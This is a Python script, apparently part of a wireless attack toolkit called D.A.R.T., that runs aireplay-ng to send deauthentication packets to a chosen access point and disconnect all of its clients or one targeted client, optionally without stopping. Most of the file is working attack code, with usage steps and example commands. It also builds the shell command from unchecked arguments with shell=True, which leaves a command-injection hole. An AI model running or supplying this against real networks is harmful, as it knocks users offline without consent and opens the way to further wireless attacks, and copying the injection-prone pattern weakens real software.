"""
Deauthentication Attack Script for D.A.R.T.

Sends deauthentication packets to a target access point using aireplay-ng,
disconnecting clients from the network. Can target all clients (broadcast)
or a specific client by MAC address.

Requires monitor mode to already be running via MonitorModeManager.py.
Uses the interface defined in config.py.

Usage:
    1. Start monitor mode:  sudo python MonitorModeManager.py
    2. Find your target:    sudo python MonitorBssidFind.py
    3. Run deauth attack:   sudo python DeauthCommand.py <BSSID> <count>

Examples:
    sudo python DeauthCommand.py AA:BB:CC:DD:EE:FF 10
    sudo python DeauthCommand.py AA:BB:CC:DD:EE:FF 0
    sudo python DeauthCommand.py AA:BB:CC:DD:EE:FF 10 --client 11:22:33:44:55:66

aireplay-ng flags used:
    -0 <count>                      Deauthentication attack mode; number of
                                    packets to send (0 = continuous until Ctrl+C)
    -a XX:XX:XX:XX:XX:XX            Target access point BSSID/MAC address
    -c XX:XX:XX:XX:XX:XX            (Optional) Specific client MAC to deauth;
                                    omit to broadcast deauth to all clients
"""

import argparse
import os
import sys
import subprocess

from config import MON_INTERFACE, MM_LOCK_FILE


def check_monitor_mode():
    """Verify that monitor mode is active by checking for the lock file."""
    if not os.path.exists(MM_LOCK_FILE):
        print("[!] Monitor mode is not active.")
        print("    Start it first:  sudo python MonitorModeManager.py")
        sys.exit(1)
    print(f"[+] Monitor mode confirmed active on {MON_INTERFACE}")


def main():
    parser = argparse.ArgumentParser(
        description="Send deauthentication packets to a target access point."
    )

    parser.add_argument("BSSID",
        help="The target access point's BSSID/MAC address (e.g., AA:BB:CC:DD:EE:FF)")

    parser.add_argument("count",
        help="Number of deauth packets to send (0 = continuous until Ctrl+C)")

    parser.add_argument("--client", "-c",
        default=None,
        help="Specific client MAC address to deauth (default: broadcast to all clients)")

    args = parser.parse_args()

    check_monitor_mode()

    print(f"[*] Starting deauthentication attack")
    print(f"    Target AP:  {args.BSSID}")
    print(f"    Client:     {args.client if args.client else 'ALL (broadcast)'}")
    print(f"    Packets:    {'Continuous' if args.count == '0' else args.count}")
    print(f"    Interface:  {MON_INTERFACE}")
    print()

    # Build the aireplay-ng command
    cmd = f"aireplay-ng -0 {args.count} -a {args.BSSID}"
    if args.client:
        cmd += f" -c {args.client}"
    cmd += f" {MON_INTERFACE}"

    # aireplay-ng is interactive — run without suppressing output
    subprocess.run(cmd, shell=True, check=False)


if __name__ == "__main__":
    if os.geteuid() != 0:
        sys.exit("Error: This script must be run as sudo.")
    main()